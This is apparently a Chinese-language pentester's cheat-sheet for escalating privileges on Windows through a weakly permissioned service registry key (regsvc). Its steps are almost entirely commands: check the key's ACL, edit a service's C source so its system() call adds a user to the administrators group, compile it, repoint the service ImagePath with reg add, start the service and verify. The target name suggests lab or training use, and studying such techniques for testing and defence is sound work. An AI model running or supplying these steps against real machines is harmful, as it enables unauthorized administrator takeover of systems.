# 注册表服务项权限异常（powershell执行）

> **需要完全权限**，\
> **并且具有敏感函数文件**，.c文件应该是工具跑出来的

```python
检查权限
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

发现特殊权限
FullContol

将源码文件复制下来
windows_service.c一般是这个

修改敏感函数命令
例如：system() 函数使用的命令替换为： cmd.exe /k net localgroup administrators user /add 

编译
x86_64-w64-mingw32-gcc windows_service.c -o x.exe

指向
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /dc:\temp\x.exe /f 

 启动
 sc start regsvc 
 
检验
net localgroup administrators 

HKLM\SYSTEM\CurrentControlSet\services\regsvc 是要添加的子项的完整路径
/v Image Path 是添加注册表项的名称
/t REG_EXPAND_SZ 是注册表项的类型
/dc:\temp\x.exe 是新注册表项的数据（在这种情况下，在我们的恶意文件中）
/f 需要添加注册表项而不提示确认 

```
